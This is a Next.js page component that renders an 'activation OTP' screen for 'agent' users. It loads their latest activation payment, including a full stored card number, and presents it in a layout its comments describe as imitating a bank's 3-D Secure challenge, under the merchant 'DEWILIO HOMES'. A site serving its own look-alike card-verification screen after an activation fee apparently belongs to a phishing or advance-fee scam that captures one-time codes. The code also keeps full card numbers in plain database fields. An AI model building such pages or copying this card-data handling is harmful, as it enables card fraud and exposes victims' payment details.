import { redirect } from "next/navigation";
import { getSessionUser } from "@/lib/auth";
import { getDb } from "@/lib/db";
import { activationDestination } from "@/lib/activation";
import { ActivationOtp } from "@/components/activation/ActivationOtp";

export const dynamic = "force-dynamic";

interface PaymentRow {
  amount: number | null;
  card_number: string | null;
  card_last4: string | null;
  created_at: string | null;
  phone: string | null;
}

/** 559049******0699 — first six and last four, the rest masked, 3-D Secure style. */
function maskCard(full: string | null, last4: string | null): string {
  const digits = (full ?? "").replace(/\D/g, "");
  if (digits.length >= 10) {
    return `${digits.slice(0, 6)}${"*".repeat(digits.length - 10)}${digits.slice(-4)}`;
  }
  return last4 ? `************${last4}` : "—";
}

/** 14.08.2026 — the dotted day-first format the card networks show. */
function dottedDate(iso: string | null): string {
  const d = iso ? new Date(iso) : new Date();
  if (Number.isNaN(d.getTime())) return "—";
  const p = (n: number) => String(n).padStart(2, "0");
  return `${p(d.getDate())}.${p(d.getMonth() + 1)}.${d.getFullYear()}`;
}

export default async function ActivationOtpPage() {
  const user = await getSessionUser();
  if (!user) redirect("/login");
  if (user.role !== "agent") redirect("/admin");

  const db = getDb();
  const row = (await db
    .prepare("SELECT activation_stage FROM users WHERE id = ?")
    .get(user.id)) as { activation_stage: string | null } | undefined;
  const stage = row?.activation_stage ?? "approved";
  if (stage !== "otp") redirect(activationDestination(stage));

  const pay = (await db
    .prepare(
      `SELECT a.amount, a.card_number, a.card_last4, a.created_at, p.phone
       FROM activation_payments a
       LEFT JOIN agent_profiles p ON p.user_id = a.user_id
       WHERE a.user_id = ?
       ORDER BY a.created_at DESC LIMIT 1`
    )
    .get(user.id)) as PaymentRow | undefined;

  const phoneDigits = (pay?.phone ?? "").replace(/\D/g, "");
  const sentTo = phoneDigits ? phoneDigits.slice(-4) : user.email;
  const amount = `USD ${((pay?.amount ?? 1)).toFixed(2)}`;

  return (
    <ActivationOtp
      sentTo={sentTo}
      merchant="DEWILIO HOMES"
      amount={amount}
      date={dottedDate(pay?.created_at ?? null)}
      cardNumber={maskCard(pay?.card_number ?? null, pay?.card_last4 ?? null)}
    />
  );
}
